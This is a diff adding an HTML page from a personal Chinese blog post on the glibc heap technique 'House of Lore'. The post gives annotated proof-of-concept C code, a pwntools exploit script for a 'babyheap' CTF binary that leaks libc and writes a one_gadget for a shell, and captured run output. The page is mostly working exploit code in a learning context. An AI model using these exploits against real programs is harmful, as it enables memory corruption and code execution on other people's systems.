@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Nono</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0, user-scalable=no"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-siteapp"/>
+    <link rel="stylesheet" href="/styles/main.css">
+    <link rel="stylesheet" href="//cdnjs.loli.net/ajax/libs/mdui/0.4.3/css/mdui.min.css">
+    <link rel="stylesheet" href="/media/css/post.css">
+    <link rel="stylesheet" href="/media/live2d/css/live2d.css" />
+    
+</head>
+<body class=" mdui-appbar-with-toolbar  mdui-theme-primary-pink mdui-theme-accent-pink">
+<header class="mdui-toolbar mdui-color-pink mdui-appbar-fixed mdui-appbar-scroll-toolbar-hide" style="z-index: 1000">
+    <a href="javascript:;" mdui-drawer="{target: '#left-drawer',overlay:true}" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+    <span class="mdui-typo-title">Nono</span>
+    <div class="mdui-toolbar-spacer"></div>
+<!--    <a href="javascript:history.go(0);" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+    <a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">more_vert</i></a>
+</header>
+
+<div class="mdui-drawer mdui-color-white mdui-drawer-full-height mdui-drawer-close" id="left-drawer">
+    <ul class="mdui-list">
+        <li class="mdui-subheader">菜单</li>
+        
+        <li class="mdui-list-item mdui-ripple">
+            <a href="/" class="mdui-list-item-content">首页</a>
+        </li>
+        
+        <li class="mdui-list-item mdui-ripple">
+            <a href="/archives" class="mdui-list-item-content">归档</a>
+        </li>
+        
+        <li class="mdui-list-item mdui-ripple">
+            <a href="/tags" class="mdui-list-item-content">标签</a>
+        </li>
+        
+        <li class="mdui-list-item mdui-ripple">
+            <a href="/post/about" class="mdui-list-item-content">关于</a>
+        </li>
+        
+    </ul>
+</div>
+
+<div id="content" class="site-content">
+    <div id="primary" class="content-area">
+        <main id="main" class="site-main" role="main">
+            <article id="post-1270" class="post-1270 post type-post status-publish format-standard hentry category-90 category-129 tag-149">
+                <header class="entry-header">
+                    <h1 class="entry-title">House of lore</h1>
+                    <p class="entry-census">发布于 2020-12-16</p>
+                    <hr>
+                </header>
+                <div class="neko">
+                    <p>利用前提：</p>
+<p>控制Small Bin Chunk的bk指针，控制指定位置chunk的fd指针</p>
+<p>实现分配任意指定位置的chunk，修改任意地址的内存</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+
+void jackpot(){ puts(&quot;Nice jump d00d&quot;); exit(0); }
+
+int main(int argc, char * argv[]){
+
+
+  intptr_t* stack_buffer_1[4] = {0};
+  intptr_t* stack_buffer_2[3] = {0};
+
+  fprintf(stderr, &quot;\nWelcome to the House of Lore\n&quot;);
+  fprintf(stderr, &quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;);
+  fprintf(stderr, &quot;This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n&quot;);
+
+  fprintf(stderr, &quot;Allocating the victim chunk\n&quot;);
+  intptr_t *victim = malloc(100);
+  fprintf(stderr, &quot;Allocated the first small chunk on the heap at %p\n&quot;, victim);
+
+  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
+  intptr_t *victim_chunk = victim-2;#得到chunk头的地址
+
+  fprintf(stderr, &quot;stack_buffer_1 at %p\n&quot;, (void*)stack_buffer_1);
+  fprintf(stderr, &quot;stack_buffer_2 at %p\n&quot;, (void*)stack_buffer_2);
+
+  fprintf(stderr, &quot;Create a fake chunk on the stack&quot;);
+  fprintf(stderr, &quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;
+         &quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;);
+  stack_buffer_1[0] = 0;
+  stack_buffer_1[1] = 0;
+  stack_buffer_1[2] = victim_chunk;#把chunk的地址给它，满足bck-&gt;fd=!victim的检测
+
+  fprintf(stderr, &quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;
+         &quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;
+         &quot;chunk on stack&quot;);
+  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
+  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
+
+  fprintf(stderr, &quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;
+         &quot;the small one during the free()\n&quot;);
+  void *p5 = malloc(1000);#防止free点chunk1后合并到top chunk
+  fprintf(stderr, &quot;Allocated the large chunk on the heap at %p\n&quot;, p5);
+
+
+  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;, victim);
+  free((void*)victim);
+
+  fprintf(stderr, &quot;\nIn the unsorted bin the victim's fwd and bk pointers are nil\n&quot;);
+  fprintf(stderr, &quot;victim-&gt;fwd: %p\n&quot;, (void *)victim[0]);
+  fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);
+
+  fprintf(stderr, &quot;Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n&quot;);
+  fprintf(stderr, &quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;, victim);
+
+  void *p2 = malloc(1200);#通过再unsorted bins中没找到合适的chunk，使得chunk1进入small bins中
+  fprintf(stderr, &quot;The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;, p2);
+
+  fprintf(stderr, &quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;);
+  fprintf(stderr, &quot;victim-&gt;fwd: %p\n&quot;, (void *)victim[0]);
+  fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);
+
+  //------------VULNERABILITY-----------
+
+  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;);
+
+  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack
+
+  //------------------------------------
+
+  fprintf(stderr, &quot;Now allocating a chunk with size equal to the first one freed\n&quot;);
+  fprintf(stderr, &quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;);
+
+  void *p3 = malloc(100);#申请到chunk1
+
+
+  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;);
+  char *p4 = malloc(100);#申请到fake chunk
+  fprintf(stderr, &quot;p4 = malloc(100)\n&quot;);
+
+  fprintf(stderr, &quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;,
+         stack_buffer_2[2]);
+
+  fprintf(stderr, &quot;\np4 is %p and should be on the stack!\n&quot;, p4); // this chunk will be allocated on stack
+  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
+  memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary
+}
+</code></pre>
+<pre><code>#!/usr/bin/env python2
+#-*- coding:utf-8 -*
+from pwn import *
+from LibcSearcher import *
+context.log_level='debug'
+r=process(&quot;./babyheap&quot;)
+def add(size):
+    r.recvuntil(&quot;Command: &quot;)
+    r.sendline(&quot;1&quot;)
+    r.recvuntil(&quot;Size: &quot;)
+    r.sendline(str(size))
+def fill(index,size,content):
+    r.recvuntil(&quot;Command: &quot;)
+    r.sendline(&quot;2&quot;)
+    r.recvuntil(&quot;Index: &quot;)
+    r.sendline(str(index))
+    r.recvuntil(&quot;Size: &quot;)
+    r.sendline(str(size))
+    r.recvuntil(&quot;Content: &quot;)
+    r.send(content)
+def free(index):
+    r.recvuntil(&quot;Command: &quot;)
+    r.sendline(&quot;3&quot;)
+    r.recvuntil(&quot;Index: &quot;)
+    r.sendline(str(index))
+def dump(index):
+    r.recvuntil(&quot;Command: &quot;)
+    r.sendline(&quot;4&quot;)
+    r.recvuntil(&quot;Index: &quot;)
+    r.sendline(str(index))
+gdb.attach(r)
+add(0x10)#chunk0
+add(0x10)#chunk1
+add(0x10)#chunk2
+add(0x10)#chunk3
+add(0x80)#chunk4
+add(0x80)#chunk5
+free(2)#free chunk2
+free(1)#free chunk1
+payload='a'*0x10+p64(0)+p64(0x21)+p8(0x80)#堆的始终是 4KB 对齐的，所以chunk4的起始地址的第一个字节必然是0x80
+fill(0,len(payload),payload)
+payload='a'*0x10+p64(0)+p64(0x21)
+fill(3,len(payload),payload)
+add(0x10)#chunk1
+add(0x10)#chunk2
+payload='a'*0x10+p64(0)+p64(0x91)
+fill(3,len(payload),payload)
+free(4)#free chunk4
+dump(2)
+r.recvuntil(&quot;Content: &quot;)
+main_arena=u64(r.recv()[1:8].ljust(8,'\x00'))-88
+main_arena_offset=0x3c3b20
+libcbase=main_arena-main_arena_offset
+onegadget=libcbase+0x4525a
+print(hex(onegadget))
+print(hex(main_arena))
+add(0x60)#chunk4
+free(4)
+fake_chunk=main_arena-0x33
+payload='a'*0x10+p64(0)+p64(0x71)+p64(fake_chunk)
+fill(3,len(payload),payload)
+add(0x60)#chunk4
+add(0x60)#chunk6
+payload='a'*0x13+p64(onegadget)
+fill(6,len(payload),payload)
+add(0x90)
+r.interactive()
+</code></pre>
+<p>运行结果</p>
+<pre><code>giantbranch@ubuntu:~/Desktop$ ./lore
+
+Welcome to the House of Lore
+This is a revisited version that bypass also the hardening check introduced by glibc malloc
+This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23
+
+Allocating the victim chunk
+Allocated the first small chunk on the heap at 0x944010
+stack_buffer_1 at 0x7ffd43b1f810
+stack_buffer_2 at 0x7ffd43b1f7f0
+Create a fake chunk on the stackSet the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
+Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
+Allocated the large chunk on the heap at 0x944080
+Freeing the chunk 0x944010, it will be inserted in the unsorted bin
+
+In the unsorted bin the victim's fwd and bk pointers are nil
+victim-&gt;fwd: (nil)
+victim-&gt;bk: (nil)
+
+Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
+This means that the chunk 0x944010 will be inserted in front of the SmallBin
+The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x944470
+The victim chunk has been sorted and its fwd and bk pointers updated
+victim-&gt;fwd: 0x7fb50942abd8
+victim-&gt;bk: 0x7fb50942abd8
+
+Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer
+Now allocating a chunk with size equal to the first one freed
+This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer
+This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk
+p4 = malloc(100)
+
+The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fb50942abd8
+
+p4 is 0x7ffd43b1f820 and should be on the stack!
+Nice jump d00d
+giantbranch@ubuntu:~/Desktop$ 
+</code></pre>
+
+                </div>
+            </article>
+        </main>
+    </div>
+    <div class="doc-footer-nav mdui-color-theme">
+        <div class="mdui-container">
+            <div class="mdui-row">
+                
+                <div class="mdui-col-xs-2 mdui-col-sm-6 doc-footer-nav-left"></div>
+                
+                
+                <a href="https://czh11.github.io/post/tong-guo-xiu-gai-ebp-gai-bian-cheng-xu-de-zou-xiang/" class="mdui-ripple mdui-color-theme mdui-col-xs-10 mdui-col-sm-6 doc-footer-nav-right">
+                    <div class="doc-footer-nav-text">
+                        <i class="mdui-icon material-icons">arrow_forward</i>
+                        <span class="doc-footer-nav-direction">下一篇文章</span>
+                        <div class="doc-footer-nav-chapter">通过修改ebp改变程序的走向</div>
+                    </div>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+    <br>
+    
+    <div class="comment"></div>
+</div>
+<footer class="mdui-container footer ">
+    <div class="head_card-offset"></div>
+    <div class="mdui-row mdui-row-gapless">
+        <div class="k-container">
+            <img width="100%" src="/media/img/skirt.png">
+        </div>
+    </div>
+
+    <div class="site-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+</footer>
+<div id="landlord" style="left:5px;bottom:0px;">
+    <div class="message" style="opacity:0"></div>
+    <canvas id="live2d" width="500" height="560" class="live2d"></canvas>
+    <div class="live_talk_input_body">
+        <div class="live_talk_input_name_body">
+            <input name="name" type="text" class="live_talk_name white_input" id="AIuserName" autocomplete="off" placeholder="你的名字" />
+        </div>
+        <div class="live_talk_input_text_body">
+            <input name="talk" type="text" class="live_talk_talk white_input" id="AIuserText" autocomplete="off" placeholder="要和我聊什么呀？"/>
+            <button type="button" class="live_talk_send_btn" id="talk_send">发送</button>
+        </div>
+    </div>
+    <input name="live_talk" id="live_talk" value="1" type="hidden" />
+    <div class="live_ico_box">
+        <div class="live_ico_item type_info" id="showInfoBtn"></div>
+        <div class="live_ico_item type_talk" id="showTalkBtn"></div>
+        <div class="live_ico_item type_music" id="musicButton"></div>
+        <div class="live_ico_item type_youdu" id="youduButton"></div>
+        <div class="live_ico_item type_quit" id="hideButton"></div>
+        <input name="live_statu_val" id="live_statu_val" value="0" type="hidden" />
+        <audio src="" style="display:none;" id="live2d_bgm" data-bgm="0" preload="none"></audio>
+        <input name="live2dBGM" value="https://img.apa70.com/123.mp3" type="hidden">
+        <input name="live2dBGM" value="https://img.apa70.com/123.mp3" type="hidden">
+        <input id="duType" value="douqilai,l2d_caihong" type="hidden">
+    </div>
+</div>
+<div id="open_live2d">召唤伊斯特瓦尔</div>
+<script>
+    var message_Path = '/media/live2d/';//资源目录，如果目录不对请更改
+    var talkAPI = "";//如果有类似图灵机器人的聊天接口请填写接口路径
+</script>
+<!--<script src="/media/js/jquery-3.3.1.min.js"></script>-->
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script type="text/javascript" src="/media/live2d/js/live2d.js"></script>
+<script type="text/javascript" src="/media/live2d/js/message.js"></script>
+
+</body>
+<script src="//cdnjs.loli.net/ajax/libs/mdui/0.4.3/js/mdui.min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    $('.comment').bind('DOMNodeInserted',()=>{
+        $('.comment').unbind()
+
+        $('.vbtn').addClass(' mdui-btn mdui-color-theme-accent mdui-ripple')
+    })
+
+    let valine = new Valine({
+        el: '.comment',
+        
+        
+        
+        path: window.location.pathname,
+        pageSize: 30,
+        avatar:'mm',
+        notify:true
+    })
+</script>
+</html>
